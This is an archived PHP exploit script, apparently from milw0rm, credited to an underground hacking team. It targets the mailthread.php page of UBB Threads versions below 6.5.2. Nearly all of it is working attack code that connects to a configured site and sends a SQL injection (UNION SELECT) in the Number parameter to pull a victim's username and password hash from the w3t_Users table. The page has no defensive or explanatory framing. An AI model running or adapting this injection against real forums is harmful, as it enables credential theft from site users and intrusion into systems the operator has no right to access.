<html>
<head>
<title>UBB Threads < 6.5.2 Beta (mailthread.php) SQL Injection Exploit</title>
<pre>
&lt;?php
#############################################################################
#      T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
#############################################################################
# Vulnerable:   UBBCentral SQL Injection
#
# Exploit By :  MH_p0rtal
#
# Discovered By: James Bercegay
#############################################################################
#  Gr33tz To ==&gt;   Alpha_programmer , Oil_karchack , The_CephaleX , Str0ke
#
#  And Iranian Hacking &amp; Security Teams :
#  IHS TeaM , alphaST , Shabgard Security Team  , Emperor Hacking Team  ,
#  Crouz Security Team  &amp; Simorgh-ev Security Team
#############################################################################
# ___________Config :
# please replace your address :
$url = &quot;http:///www.example.com&quot;;
# please replace your dir address :
$dirs = &quot;/dir/to/ubbt/&quot;;
# __________End Config
#############################################################################
$aa = strlen ( $dirs );
$ab = $aa - 1;
$ac = 0;
if ((  $dirs[$ab] == &quot;/&quot; )  &amp;&amp;  ( $dirs[$ac] == &quot;/&quot; ))   {
$merg = $dirs.mailthread.php;
$fc = fsockopen(&quot;$url&quot;, 80, $errno, $errstr, 30);
if (!$fc) {

echo &quot;Can't Connect\n&quot;;
} else {
   $mh = &quot;GET $merg?Cat=0&amp;Board=UBB2&amp;Number=-99'%20UNION%20SELECT%20U_Username,U_Password%20FROM%20w3t_Users%20WHERE%20U_Username%20=%20'victim'/*&amp;page=0&amp;vc=1&amp;fpart=1&amp;what=showflat  HTTP/1.1\r\n&quot;;
   $mh .= &quot;Host: $url\r\n&quot;;
   $mh .= &quot;Connection: Close\r\n\r\n&quot;;

  fwrite($fc, $mh);
  while (!feof($fc)) {
  echo fgets($fc, 1024);
  }
   fclose($fc);
}
} else {
echo &quot; Your pattern doesn't equal with Exploit directory pattern &quot;;
}
?&gt;

# milw0rm.com [2005-06-25]
</pre>
</html>

